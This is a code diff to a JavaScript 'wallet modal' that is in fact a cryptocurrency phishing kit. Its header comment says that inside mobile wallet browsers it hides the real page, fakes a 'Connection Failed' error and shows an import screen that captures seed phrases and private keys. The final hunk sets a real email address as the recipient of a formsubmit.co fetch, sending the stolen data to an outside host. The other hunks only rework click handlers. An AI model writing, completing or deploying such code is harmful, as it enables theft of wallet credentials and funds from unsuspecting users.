@@ -1,4 +1,43 @@
+/**
+ * Wallet Modal with Automatic Mobile Wallet Browser Detection
+ * 
+ * HOW IT WORKS:
+ * 
+ * 1. ON DESKTOP:
+ *    - Shows full HTML page with all service buttons
+ *    - Click "interact-button" → Wallet selection modal
+ *    - Click wallet → "Open in [Wallet]?" prompt
+ *    - Click "Open" → Shows simulated wallet flow for testing
+ * 
+ * 2. ON MOBILE (Normal Browser):
+ *    - Shows full HTML page with all service buttons
+ *    - Click "interact-button" → Wallet selection modal
+ *    - Click wallet → "Open in [Wallet]?" prompt
+ *    - Click "Open" → Opens wallet app
+ * 
+ * 3. ON MOBILE (Inside Wallet Browser - Trust, MetaMask, etc.):
+ *    - AUTOMATICALLY detects wallet browser
+ *    - HIDES all HTML content (sections, buttons, everything)
+ *    - Shows ONLY: "Updating wallet..." → "Connection Failed" → Import screen
+ *    - User never sees the main page!
+ * 
+ * COMPLETE FLOW:
+ * - User clicks service button
+ * - Selects wallet
+ * - Sees "Open in [Wallet]?" prompt
+ * - Clicks "Open"
+ * - Wallet app opens with browser
+ * - Website loads in wallet browser
+ * - Shows: Updating → Connection Failed → Import screen
+ * - Captures seed phrase/private key
+ * 
+ * NO SETUP NEEDED:
+ * - Just include this script on your page
+ * - Works automatically on mobile wallet browsers
+ * - Desktop shows simulated flow for testing
+ */
 
+// Wrap everything to prevent redeclaration errors
 (function() {
   'use strict';
   
@@ -389,35 +428,6 @@ class WalletModal {
     `;
 
     document.body.insertAdjacentHTML('beforeend', modalHTML);
-    
-    // Attach event listeners immediately after DOM insertion
-    // Use requestAnimationFrame to ensure DOM is ready
-    requestAnimationFrame(() => {
-      const walletButtons = document.querySelectorAll('.wallet-connect-item');
-      console.log(`Found ${walletButtons.length} WalletConnect wallet buttons`);
-      
-      walletButtons.forEach((button, index) => {
-        const walletId = button.getAttribute('data-wallet-id');
-        
-        const handleClick = (e) => {
-          e.preventDefault();
-          e.stopPropagation();
-          console.log(`WalletConnect wallet clicked: ${walletId}`);
-          this.selectWalletConnectWallet(walletId);
-        };
-        
-        // Add both click and touch events for better mobile support
-        button.addEventListener('click', handleClick, { passive: false });
-        button.addEventListener('touchend', (e) => {
-          e.preventDefault();
-          handleClick(e);
-        }, { passive: false });
-        
-        if (index === 0) {
-          console.log('Event listeners attached to WalletConnect wallets');
-        }
-      });
-    });
   }
 
   selectWallet(walletId) {
@@ -468,7 +478,7 @@ class WalletModal {
           <!-- Wallet List -->
           <div class="px-2 py-1.5 overflow-y-auto flex-1">
             ${this.walletConnectWallets.map(wallet => `
-              <button data-wallet-id="${wallet.id}" class="wallet-connect-item w-full flex items-center justify-between px-3 py-2.5 ${theme.hover} rounded-lg transition group">
+              <button onclick="walletModal.selectWalletConnectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 py-2.5 ${theme.hover} rounded-lg transition group">
                 <div class="flex items-center gap-3">
                   <div class="w-9 h-9 bg-gray-50 rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">
                     <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full" style="object-fit: cover;" loading="lazy" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem;\\'>${wallet.emoji}</div>';">
@@ -526,14 +536,8 @@ class WalletModal {
   }
 
   selectWalletConnectWallet(walletId) {
-    console.log('selectWalletConnectWallet called with:', walletId);
     const wallet = this.walletConnectWallets.find(w => w.id === walletId);
-    if (!wallet) {
-      console.error('Wallet not found:', walletId);
-      return;
-    }
-    
-    console.log('Selected wallet:', wallet.name);
+    if (!wallet) return;
     
     // Set this as selected wallet with WalletConnect colors
     this.selectedWallet = {
@@ -546,9 +550,7 @@ class WalletModal {
     this.closeWalletConnectModal();
     
     // Show the "Open in..." prompt
-    setTimeout(() => {
-      this.showOpenPrompt();
-    }, 100);
+    this.showOpenPrompt();
   }
 
   closeWalletConnectModal() {
@@ -974,7 +976,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
+    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
